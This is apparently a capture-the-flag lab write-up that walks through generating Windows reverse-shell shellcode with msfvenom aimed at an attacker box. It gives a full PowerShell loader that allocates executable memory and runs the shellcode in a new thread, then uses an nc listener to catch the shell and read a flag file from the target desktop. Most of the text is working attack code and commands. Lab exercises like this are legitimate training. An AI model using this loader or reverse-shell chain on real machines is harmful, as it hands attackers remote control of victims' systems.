Today we learn to write and generate shellcode for reverse shells.

We are asked to read the file `flag.txt` which is present on the desktop of Glitch on port `4444` .
+ Firstly we do `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=4444 -f powershell`. Which gives us a piece of the shellcode that we will be adding to our shell script later on.
+ Now we write the powershell script, where `SHELLCODE_PLACEHOLDER` will be replaced by the series of hexadecimal numbers we just got as the output.
  ```
  $VrtAlloc = @"
  using System;
  using System.Runtime.InteropServices;
  
  public class VrtAlloc{
      [DllImport("kernel32")]
      public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
  }
  "@
  
  Add-Type $VrtAlloc 
  
  $WaitFor= @"
  using System;
  using System.Runtime.InteropServices;
  
  public class WaitFor{
   [DllImport("kernel32.dll", SetLastError=true)]
      public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
  }
  "@
  
  Add-Type $WaitFor
  
  $CrtThread= @"
  using System;
  using System.Runtime.InteropServices;
  
  public class CrtThread{
   [DllImport("kernel32", CharSet=CharSet.Ansi)]
      public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
  }
  "@
  Add-Type $CrtThread   
  
  [Byte[]] $buf = SHELLCODE_PLACEHOLDER
  [IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
  [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
  $thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
  [WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
  ```
+ Now we type in `nc -nvlp 4444` which will start a listener on port 4444.
+ Now we write the powershell script in `Windows Powershell` in the machine of `Glitch` line by line. After this we should get succesfull connection with `Glitch`'s machine.

  ![image](https://github.com/user-attachments/assets/ec2aa0f4-847b-40ce-94f0-98e421675dea)

  ![image](https://github.com/user-attachments/assets/0612df3f-8928-4799-9c5e-457a5d506231)

+ No we read `flag.txt` by doing `type C:\Users\glitch\Desktop\flag.txt`.

  ![image](https://github.com/user-attachments/assets/9a969740-8535-4820-ac20-93950ce73978)


  

    
